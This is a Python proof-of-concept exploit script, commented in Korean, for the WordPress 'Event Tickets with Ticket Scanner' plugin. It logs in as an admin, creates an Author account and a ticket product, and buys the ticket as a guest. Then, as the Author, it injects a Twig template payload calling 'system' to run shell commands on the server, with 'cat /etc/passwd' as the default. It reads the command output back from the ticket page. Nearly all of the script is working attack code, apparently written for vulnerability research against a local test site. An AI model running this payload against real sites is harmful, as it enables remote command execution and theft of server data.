import re
import string
import json
import random
import requests
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup


# Author ID/PW
AUTHOR_ID = "author"
AUTHOR_PW = "author"

# 프록시 설정을 하려면 아래 변수에 서버 주소를 입력하세요.
PROXY_SERVER = None
proxies = {
    "https": PROXY_SERVER,
    "http": PROXY_SERVER,
}

PRODUCT_TICKET_INFO = {
    "saso_eventtickets_list": 1,
    "saso_eventtickets_is_ticket": "yes",
    "saso_eventtickets_event_location": "Madison Square Garden, New York City",
    "saso_eventtickets_ticket_start_date": datetime.now().strftime("%Y-%m-%d"),
    "saso_eventtickets_ticket_start_time": "00:00",
    "saso_eventtickets_ticket_end_date": datetime.now().strftime("%Y-%m-%d"),
    "saso_eventtickets_ticket_end_time": "12:00",
    "saso_eventtickets_ticket_max_redeem_amount":1,
    "saso_eventtickets_ticket_is_ticket_info":"",
    "saso_eventtickets_ticket_amount_per_item":1,
    "saso_eventtickets_request_name_per_ticket_label":"",
    "saso_eventtickets_request_value_per_ticket_label":"",
    "saso_eventtickets_request_value_per_ticket_values":"",
    "saso_eventtickets_request_value_per_ticket_def":"",
    "saso_eventtickets_list_formatter_values": json.dumps({"input_prefix_codes":"","input_type_codes":"1","input_amount_letters":12,"input_letter_excl":"2","input_letter_style":1,"input_include_numbers":"1","input_serial_delimiter":"1","input_serial_delimiter_space":None,"input_number_start":10000,"input_number_offset":1})
}

def __login_get_session(login_id, login_pw):
    session = requests.session()
    data = {
        "log": login_id,
        "pwd": login_pw,
        "wp-submit": "Log In",
        "testcookie": 1
    }
    resp = session.post(f"{TARGET}/wp-login.php", data=data, proxies=proxies)
    if True in [ "wordpress_logged_in_" in cookie for cookie in resp.cookies.keys() ]:
        print(f" |- 계정 {login_id} 로그인에 성공 했습니다.")
        return session
    else:
        raise Exception(f"[-] 로그인에 실패했습니다.")

def __add_user(admin_session, new_user_id, new_user_pw, role):
    resp = admin_session.get(f"{TARGET}/wp-admin/user-new.php", proxies=proxies)
    pattern = r'_wpnonce_create-user" value="(.{10})"'
    match = re.search(pattern, resp.text)
    if match:
        wp_create_user_nonce = match.group(1)
        data = {
            "action": "createuser",
            "_wpnonce_create-user": wp_create_user_nonce,
            "_wp_http_referer": "/wp-admin/user-new.php",
            "user_login": f"{new_user_id}",
            "email": f"{new_user_id}@example.com",
            "first_name": "",
            "last_name": "",
            "url": "",
            "pass1": f"{new_user_pw}",
            "pass2": f"{new_user_pw}",
            "pw_weak": "on",
            "send_user_notification": 1,
            "role": f"{role}",
            "createuser": "Add+New+User"
        }
        admin_session.post(f"{TARGET}/wp-admin/user-new.php", data=data, proxies=proxies)
        print(f" |- 계정 {new_user_id}(role: {role}) 생성에 성공 했습니다.")
    else:
        raise Exception(f"[-] 사용자 추가 시 필요한 _wpnonce_create-user 값을 발견하지 못했습니다.")

def __add_product(admin_session, prod_title):
    print(f" |- 상품({prod_title})을 추가합니다.")
    resp = admin_session.get(f"{TARGET}/wp-admin/post-new.php?post_type=product", proxies=proxies)
    pattern = r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*value=[\'"]([^\'"]+)[\'"]'
    matches = re.findall(pattern, resp.text)
    data = {}
    for name, value in matches:
        if "-hide" in name: continue
        elif "saso_" in name: continue
        data[name] = value
    data["mm"] = data["cur_mm"] # Undefined array key "mm" in /wp-admin/includes/post.php
    data["visibility"] = "public"  # show product
    data["_visibility"] = "visible" # show product
    data["_regular_price"] = 0
    data["post_title"] = prod_title
    
    print(f" |- 상품({prod_title})에 티켓 정보를 추가합니다.")
    
    # 티켓 정보 추가
    for ticket_key, ticket_value in PRODUCT_TICKET_INFO.items():
        data[ticket_key] = ticket_value
    
    # 상품 등록
    resp = admin_session.post(f"{TARGET}/wp-admin/post.php", data=data, proxies=proxies)
    
    # 상품 번호 가져오기
    print(f" |- 상품({prod_title}) 추가를 완료했습니다. post_ID: {data['post_ID']}")
    return data['post_ID']

def __buy_product(post_ID):    
    guest_session = requests.session()
    resp = guest_session.get(f"{TARGET}?post_type=product", proxies=proxies)
    pattern1 = r'storeApiNonce: \'(.{10})\''
    pattern2 = r'createNonceMiddleware\( "(.{10})" \)'
    match1 = re.search(pattern1, resp.text)
    match2 = re.search(pattern2, resp.text)
    if match1 and match2:
        store_nonce = match1.group(1)
        wp_nonce = match2.group(1)

        # 카트 담기
        print(f" |- 카트에 상품({post_ID})을 담았습니다.")
        data = {"requests":[{"path":"/wc/store/v1/cart/add-item","method":"POST","data":{"id":post_ID,"quantity":1},"cache":"no-store","body":{"id":post_ID,"quantity":1},"headers":{"Nonce":store_nonce}}]}
        guest_session.post(f"{TARGET}/wp-json/wc/store/v1/batch", json=data, proxies=proxies)
        
        # 결제 준비
        print(f" |- 상품({post_ID}) 주문을 요청합니다.")
        guest_session.get(f"{TARGET}/checkout/", proxies=proxies)

        # 결제 요청
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f" |- 상품({post_ID}) 결제를 요청합니다.")
        data = {"additional_fields":{},"billing_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":"address","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","email":"guest@guest.com","phone":""},"create_account":False,"customer_note":"","customer_password":"","extensions":{"woocommerce/order-attribution":{"source_type":"typein","referrer":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","utm_source_platform":"(none)","utm_creative_format":"(none)","utm_marketing_tactic":"(none)","session_entry":f"{TARGET}","session_start_time":f"{current_time}","session_pages":"3","session_count":"1","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"}},"shipping_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":"address","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","phone":""}}
        headers = {
            "Nonce": store_nonce,
            "X-WP-Nonce": wp_nonce,
            "Content-Type": "application/json"
        }
        resp = guest_session.post(f"{TARGET}/wp-json/wc/store/v1/checkout", json=data, headers=headers, proxies=proxies)
        checkout_json = resp.json()
        try:
            order_redirect_url = checkout_json['payment_result']['redirect_url']
            print(f" |- 상품({post_ID}) 결제를 성공적으로 완료했습니다.")
            
            ###
            # 4. 결제 확인 및 티켓 사이트 조회
            ###
            print(f" |- 상품({post_ID})의 티켓 사이트를 확인합니다.")
            resp = guest_session.get(f"{order_redirect_url}", proxies=proxies)
            pattern = r'Ticket number: <a target="_blank" href="([^"]+)"'
            match = re.search(pattern, resp.text)
            if match:
                ticket_url = match.group(1)
                resp = requests.get(f"{ticket_url}", proxies=proxies)
                print(f" |- Ticket URL: {ticket_url}")
                return ticket_url
            else:
                print(f"[-] 결제 확인 사이트에서 티켓 사이트를 발견하지 못했습니다.")
        except:
            raise Exception(f"[-] 상품({post_ID}) 결제를 실패했습니다.")
    else:
        raise Exception(f"[-] 상품 구매에 필요한 값(storeApiNonce 또는 createNonceMiddleware)을 발견하지 못했습니다.")

def __exploit(user_session, command):
    print(f" |- 입력한 명령어: {command}")
    resp = user_session.get(f"{TARGET}/wp-admin/admin.php?page=event-tickets-with-ticket-scanner", proxies=proxies)
    pattern = r'var\s+Ajax_sasoEventtickets\s*=\s*({.*?});'
    match = re.search(pattern, resp.text)
    try:
        if match:
            ajax_saso_eventtickets = json.loads(match.group(1))
            data = {
                "nonce": ajax_saso_eventtickets['nonce'],
                "action": "sasoEventtickets_executeAdminSettings",
                "a_sngmbh": "changeOption",
                "data[key]": "wcTicketDesignerTemplate",
                "data[value]": f"{{{{['echo \"START\";{command};echo \"END\";'] | filter('system')}}}}"
            }
            resp = user_session.post(f"{TARGET}/wp-admin/admin-ajax.php", data=data, proxies=proxies)
            if resp.json()['success']:
                print(f" |- 템플릿(티켓 사이트)에 입력한 명령어를 성공적으로 주입했습니다.")
            else:
                raise Exception("[-] 템플릿에 명령어 주입을 실패했습니다.")
        else:
            raise Exception("[-] Event Tickets with Ticket Scanner 플러그인의 옵션 설정에 필요한 값을 찾을 수 없습니다.")
    except Exception as ex:
        raise Exception(ex)

def __check_ticket_url_data(ticket_url):
    guest_session = requests.session()
    resp = guest_session.get(f"{ticket_url}", proxies=proxies)
    pattern = r'START\n([\s\S]*?)\nEND'
    match = re.search(pattern, resp.text)
    if match:
        result = match.group(1)
        print(f" | --------------------------------------")
        print("\n".join(f" | {line}" for line in result.splitlines()))
        print(f" | --------------------------------------")
    else:
        print(" |- 입력한 명령어의 결과를 템플릿에서 확인할 수 없습니다.")

def poc(command):
    ####
    # 1. 관리자 로그인
    ####
    print(f"[+] 관리자 계정으로 로그인합니다.")
    print(f" |- 계정: {ADMIN_ID}, 비밀번호: {ADMIN_PW}")
    admin_session = __login_get_session(ADMIN_ID, ADMIN_PW)
    admin_session.get(f"{TARGET}/wp-admin/", proxies=proxies)

    ####
    # 2. 사용자('Author') 등록 - 관리자
    ####
    print(f"[+] 사용자('Author') 계정을 생성합니다.")
    print(f" |- 계정: {AUTHOR_ID}, 비밀번호: {AUTHOR_PW}")
    __add_user(admin_session, AUTHOR_ID, AUTHOR_PW, "author")
    
    ###
    # 3. 상품 등록 with Event Tickets - 관리자
    ###
    print(f"[+] Event Tickets이 포함된 상품을 등록 합니다.")
    post_ID = __add_product(admin_session, "🔥 Consert Ticket Open Event 🔥")

    ###
    # 4. 티켓 사이트 획득을 위한 상품 구매 - 익명 사용자
    ###
    print(f"[+] 익명 사용자가 상품({post_ID})을 구매합니다.")
    ticket_url = __buy_product(post_ID)

    ###
    # 5. 사용자('Author') 로그인
    ###
    print(f"[+] 사용자('Author') 계정으로 로그인합니다.")
    contributor_session = __login_get_session(AUTHOR_ID, AUTHOR_PW)
    
    ###
    # 6. 사용자('Author')의 역할로 익스플로잇(SSI, Server Side Include) 수행
    ###
    print(f"[+] 사용자('Author') 계정으로 익스플로잇(SSI, Server Side Include)을 수행합니다.")
    __exploit(contributor_session, command)

    ###
    # 7. 티켓 사이트 확인
    ###
    print(f"[+] 티켓 사이트를 통해 입력한 명령어 결과를 확인합니다.")
    print(f" Ticket URL: {ticket_url}")
    print(f" Command: {command}")
    __check_ticket_url_data(ticket_url)


if __name__ == "__main__":

    # Target URL
    TARGET = "http://localhost:8080"

    # Admnistrator ID/PW
    ADMIN_ID = "admin"
    ADMIN_PW = "admin"

    # Run
    poc(command="cat /etc/passwd")
